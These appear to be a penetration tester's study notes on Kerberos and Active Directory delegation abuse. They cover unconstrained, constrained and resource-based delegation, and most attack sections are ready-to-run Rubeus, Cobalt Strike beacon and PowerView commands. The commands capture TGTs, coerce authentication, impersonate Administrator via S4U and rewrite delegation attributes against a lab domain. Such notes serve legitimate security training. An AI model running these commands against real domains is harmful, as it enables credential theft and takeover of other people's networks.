BASICS:
    works on a system of tickets where principals (users and computers) are authenticated by a central, trusted server
    relies on shared-secret cryptography to establish trust with clients
    key distribution center (KDC):
        trusted source for authentication
        consists of a database of all principals and their associated password hashes, 
            an authentication server (AS), a ticket granting server (TGS)
        in a windows domain, the KDC would be the domain controller
    ticket granting ticket (TGT):
        provided to a principal after their identity has been verified 
        used in lieu of providing their password everytime they want to access a service
    service:
        a resource that can be accessed by a principal (e.g. SMB share, MSSQL, etc.)
        each service is identified by a SPN (i.e. class/instance:port)
    service ticket:
        to access a service using kerberos, the principal must request a service ticket from the TGS
        they send their TGT to the KDC and get a ticket granting service ticket in return
    privileged attribute certificate:
        structure that can be attached to a ticket which contains additional principal information
        the service will inspect the PAC to determine the user's privilege without querying from AD

    authentication overview:
        CLIENT      KDC      SERVICE
        AS-REQ ----> |
           | <---- AS-REP
        TGS-REQ----> |
           | <---- TGS-REP
        AP-REQ ---------------> |       NOTE: optional PAC validation here
           | <--------------- AP-REP

kerberos delegation is a feature that allows one principal to request access to resources on behalf of another principal
three types: unconstrained, constrained, role-based

    unconstrained delegation:
        enabled by setting a flag called TRUSTED_FOR_DELEGATION on the UAC attribute of the computer object
            we can check which copmuters have unconstrained using: 
                beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
        HOW TO ABUSE:
            this can be abused since any copmuter configured for unconstrained delegation can be used to extract TGTs
            we can use rubeus' monitor command to capture and display TGTs as user authneticate
                beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
    constrained delegation:
        Service for User (S4U) extension was created to replace unconstrained by limiting the services to which another service can delegate access
            Service for User to Proxy (S4U2proxy) allows a service to obtain a specified service ticket on behalf of a different user
                known as constrained delegation
            Service for User to Self (S4U2self) allows a service to obtain a service ticket on behalf of a user when a user authenticated in a way other than kerberos
                known as protocol transition 
        configured via the msDS-AllowedToDelegateTo attribute of the copmuter object
            we can check the list of SPNs that the computer is allowed to delegate to using:
                beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
        constrained delegation:
            used when only kerberos authentication is enabled 
            the service will send a TGS-REQ to the KDC asking for TGS to the target SPN and include a copy of the user's cached TGS
            the KDC will verify the msDS-AllowedToDelegateTo attribute contains the target SPN then return the service ticket
        protocol transition:
            disabled unless the TRUSTED_TO_AUTH_FOR_DELEGATION flag is explicitly set on the UAC attribute of the computer object
                we can check this using:
                    beacon> ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl
                    NOTE: any value other than default 4096 should be inspected, decimal value for TRUSTED_TO_AUTH_FOR_DELEGATION is 16777216, so we would do [System.Convert]::ToBoolean(<UAC_value> -band 16777216) in PowerShell
            the service will send a TGS-REQ containing the user's username and sets the SPN to the copmuter's own samAccountName    
        HOW TO ABUSE:
            if protocol transition is enabled:
                we can obtain a TGS for any user in the domain using S4U2self
                    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap
                        where...
                            /user is the computer configured for delegation
                            /msdsspn is the service the principal is allowed to delegate to
                            /ticket is the TGT for the principal
                            /impersonateuser is the user we want to impersonate
                once we obtain the ticket, we can inspect and verify the username is that of who we impersonated
                    PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIF8[...snip...]MtMSQ=
                rubeus will take the ticket and submit an S4U2proxy request for the service we specified
                now we can interact with the service:
                    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGf[...snip...]ZzLTE=
                    beacon> steal_token 3380
            without protocol transition:
                we must obtain a service ticket that a user has already requested, hence we are limited to impersonating those whom service tickets are available
                once we have a ticket:
                    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /tgs:doIFp[...snip...]dzLTE= /nowrap
                        where...
                            /user is the computer configured for delegation
                            /msdsspn is the service the principal is allowed to delegate to
                            /ticket is the TGT for the principal
                            /tgs is a captured service ticket for a user
                now we can interact with the service, as above

service name substitution:
    technique that allows an adversary to swap a service ticket from one service to another
    since both the AS-REP and TGS-REP share the data structure KDC-REP, we can alter the SPN (sname[2] field) as it is not encrypted
        NOTE: this only works if running as the same account as the original service
    HOW TO ABUSE:
        assuming protocol transition is enabled:
        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:[ticket] /impersonateuser:Administrator /nowrap
            where...
                /user is the computer configured for delegation
                /msdsspn is the service the principal is allowed to delegate to
                /altservice is the service to substitute
                /ticket is the TGT for the principal
                /impersonateuser is the user we want to impersonate
            
S4U2self computer takeover:
    technique for going after a computer directly rather than a user (e.g. if we have no user's TGT available to use)
    we can force a computer to authenticate to another computer in several ways (i.e. SpoolSample, PetitPotam)
    so we can begin monitoring for tickets:
        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:5 /nowrap
    and then force one computer to authenticate to another:
        beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
            NOTE: this is using https://github.com/cube0x0/SharpSystemTriggers
    we will then capture the TGT via rubeus 
    then to compromise the computer once we have its TGT is to use S4U2self:
        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:[ticket] /nowrap
            where...
                /impersonateuser is the user we want to impersonate
                /self tells rubeus not to submit S4U2proxy
                /altservice is the SPN we want substituted into the service ticket
                /ticket is the TGT

resource-based constrained delegation (RBCD):
    instead of a front-end service dictating to which back-end services it can delegate to; it's the back-end service that controls which front-end services can delegate to it
    controlled by defining the front-end service account(s) in the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the back-end service
    an admin with these delegated rights can then add RBCD entries
        e.g. $front = Get-ADComputer -Identity 'lon-ws-1'
             $back = Get-ADComputer -Identity 'lon-fs-1'
             Set-ADComputer -Identity $back -PrincipalsAllowedToDelegateToAccount $front
    an adversay can gain access to any computer via RBCD if:
        they have write access to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of a computer
        they have control of another principal that has an SPN
    write access:
        search each computer's ACL and print results where AceType = GUID for the msDS-AllowedToActOnBehalfOfOtherIdentity attribute with WriteProperty
            PS C:\Users\Attacker> ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
            PS C:\Users\Attacker> $Cred = Get-Credential CONTOSO\rsteel
            PS C:\Users\Attacker> Get-DomainComputer -Server 10.10.120.1 -Credential $Cred | Get-DomainObjectAcl -Server 10.10.120.1 -Credential $Cred | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -Match 'WriteProperty' } | select ObjectDN,SecurityIdentifier
        note the SID(s) that are returned from this query and then search through AD to find the associated user/group
            PS C:\Users\Attacker> Get-ADGroup -Filter 'objectsid -eq "[SID]"' -Server 10.10.120.1 -Credential $Cred
        the returned user/group can modify the attribute on the specified computers
    account with an spn:
        NOTE: this is needed because all delegation can only be configured on accounts that have an SPN
        we can use other computer accounts that we have elevated SYSTEM privs as they all have a set SPN
        service accounts can be used if we have obtained their creds (e.g. via kerberoasting)
        if we have none of the above, we can try to create our own computer object to the domain using tools such as https://github.com/FuzzySecurity/StandIn
    the attack:
        once we have both conditions met we can begin the attack
        list the PrincipalsAllowedToDelegateToAccount attribute for the computer objects:
            PS C:\Users\Attacker> Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
        add a computer we have SYSTEM on, such as lon-wkstn-1:
            PS C:\Users\Attacker> $ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 10.10.120.1 -Credential $Cred
            PS C:\Users\Attacker> $wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 10.10.120.1 -Credential $Cred
            PS C:\Users\Attacker> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 10.10.120.1 -Credential $Cred
        verify we added our copmuter:
            PS C:\Users\Attacker> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
        now gain access to lon-fs-1 by extracting/requesting a TGT:
            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
        now perform s4u attack:
            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /nowrap
        now use the new creds:
            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:[TGS]
            beacon> steal_token [pid]
            beacon> ls \\lon-fs-1\c$
        clean up!
            PS C:\Users\Attacker> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 10.10.120.1 -Credential $Cred
            PS C:\Users\Attacker> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
